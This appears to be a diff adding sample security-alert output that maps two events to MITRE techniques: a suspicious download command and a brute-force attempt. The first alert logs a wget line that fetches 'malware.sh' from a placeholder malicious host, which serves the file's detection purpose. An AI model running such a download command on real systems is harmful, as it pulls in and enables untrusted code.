@@ -1,0 +1,9 @@
+
+[ALERT] Suspicious Command Detected
+MITRE Technique: T1059 (Command Execution)
+Log: wget http://malicious-site.com/malware.sh
+
+[ALERT] Possible Brute Force Attack
+MITRE Technique: T1110 (Brute Force)
+IP Address: 192.168.1.10
+Attempts: 4
